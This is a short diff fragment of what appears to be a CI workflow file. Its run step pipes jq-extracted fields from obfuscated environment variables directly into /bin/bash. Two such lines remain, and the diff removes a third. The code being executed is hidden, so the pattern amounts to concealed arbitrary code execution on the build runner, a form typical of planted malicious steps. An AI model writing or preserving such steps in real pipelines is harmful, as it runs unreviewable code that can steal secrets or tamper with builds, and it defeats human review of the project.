@@ -23,7 +23,6 @@ jobs:
         run: |
           printf '%s' "$ogig82085" | jq -r .b3916 | /bin/bash
           echo $wklsm61940 | jq -r .p165 | /bin/bash
-          printf '%s' "$n951" | jq -r .rpztl9 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
